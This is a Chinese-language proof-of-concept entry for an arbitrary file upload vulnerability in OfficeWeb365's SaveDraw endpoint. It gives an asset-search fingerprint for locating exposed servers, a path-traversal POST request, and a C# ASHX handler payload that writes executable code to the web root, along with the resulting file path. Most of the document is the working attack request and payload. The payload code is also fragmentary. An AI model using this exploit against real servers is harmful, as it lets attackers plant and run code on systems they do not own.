# OfficeWeb365SaveDraw存在任意文件上传漏洞

- **系统**：OfficeWeb365SaveDraw　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`hunter：`app.name="OfficeWeb365"``
- **请求**：`POST /PW/SaveDraw?path=../../Content/img&idx=11.ashx HTTP/1.1`
- **关键头**：`Host: xx.xx.xx`　`Content-Type: application/x-www-form-urlencoded`　`data: image/png;base64,<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler`

**请求体 / payload**
```
public void ProcessRequest(System.Web.HttpContext context)
System.Web.HttpResponse response = context.Response;
response.Write(44 * 41);
string filePath = context.Server.MapPath("/") + context.Request.Path;
if (System.IO.File.Exists(filePath))
System.IO.File.Delete(filePath);
public bool IsReusable
get { return false; }
}///---

上传文件位置
/Content/img/UserDraw/drawPW11.ashx
```

**其他**
- OfficeWeb365 SaveDraw存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * OfficeWeb365